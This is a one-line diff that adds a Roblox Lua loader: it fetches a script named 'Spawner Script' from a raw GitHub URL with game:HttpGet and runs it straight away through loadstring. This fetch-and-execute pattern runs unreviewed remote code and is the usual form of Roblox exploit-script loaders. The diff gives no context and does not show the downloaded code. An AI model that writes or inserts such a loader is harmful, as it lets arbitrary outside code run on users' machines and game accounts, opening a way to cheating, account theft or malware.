@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reqqewqe/SCRIPTS/refs/heads/main/Spawner%20Script",true))()
